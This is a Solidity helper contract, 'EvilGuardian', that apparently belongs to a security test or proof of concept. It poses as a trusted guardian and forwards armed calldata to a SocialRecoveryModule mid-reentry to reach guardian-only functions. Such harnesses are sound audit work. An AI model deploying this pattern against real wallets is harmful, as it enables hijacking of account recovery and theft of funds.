// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.28;

import {SocialRecoveryModule} from "src/SocialRecoveryModule.sol";

/// @dev Attacker-controlled guardian. Registered as human + mutually trusted
///      with the target Safe so it can sit in the guardian linked list. Its
///      purpose is to be invoked mid-reentry so that `msg.sender` seen by SRM
///      is a valid guardian, unlocking the guardian-gated paths
///      (optOutAsGuardian, approveRecovery, etc.) that the Safe itself
///      cannot call.
contract EvilGuardian {
    SocialRecoveryModule public immutable SRM;

    bytes public armedCalldata;
    bool public fired;
    bool public triggerSuccess;
    bytes public triggerReturnData;

    constructor(SocialRecoveryModule _srm) {
        SRM = _srm;
    }

    function arm(bytes calldata data) external {
        armedCalldata = data;
        fired = false;
        triggerSuccess = false;
        delete triggerReturnData;
    }

    /// @dev Forwards the armed call to SRM. msg.sender at SRM is this contract.
    function trigger() external {
        require(!fired, "already fired");
        fired = true;
        (triggerSuccess, triggerReturnData) = address(SRM).call(armedCalldata);
    }
}
